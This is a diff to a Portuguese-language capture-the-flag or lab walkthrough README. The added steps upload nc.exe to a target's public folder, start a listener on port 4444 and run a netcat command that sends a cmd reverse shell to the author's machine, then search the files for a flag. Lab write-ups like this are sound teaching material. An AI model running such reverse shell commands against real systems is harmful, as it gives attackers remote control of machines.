@@ -34,7 +34,22 @@
 ![image](https://github.com/user-attachments/assets/20dfd46a-d056-4dd6-ad33-0ae350bcd4a4)
 ## agora é so verificar se realmente ele foi baixado na pasta publica (ele está lá):
 ![image](https://github.com/user-attachments/assets/7a58ca23-e926-482a-bac3-34088934c625)
-## arquivo upado precisamos acessar a shell do nosso kali ( colocamos o nc para escutar na porta 4444 ):
+## arquivo upado precisamos acessar a shell do nosso win ( colocamos o nc para escutar na porta 4444 ):
+![image](https://github.com/user-attachments/assets/a5debaf5-4d6b-424a-aa99-a6b3c91a7d13)
+## porta escutando é so executar o comando: 
+```txt
+   c:\users\public\nc.exe 192.168.100.168 4444 -e cmd 
+
+    nesse comando ele ta executando o arquivo que ta no public passando o ip e a porta e o tipo de comando que vai ser usado 
+    o ip : da minha maq win , a porta que foi selecionada para falar que estava escutando do outro lado , e o e para executar o cmd no meu win
+```
+![image](https://github.com/user-attachments/assets/c7eeac35-cce7-4d21-9c70-6cfaa5b68f9b)
+## depois de executar o comando a porta que esta escutando vai receber o cmd 
+![image](https://github.com/user-attachments/assets/e768c7eb-f61c-4241-8d7e-e2997555c53c)
+## agora é so fazer enumeração de arquivos e encotrar a flag do arquivo sensivel:
+![image](https://github.com/user-attachments/assets/03169296-a4f6-4d47-8cb0-c8ded1dcf93a)
+
+
 
 
 
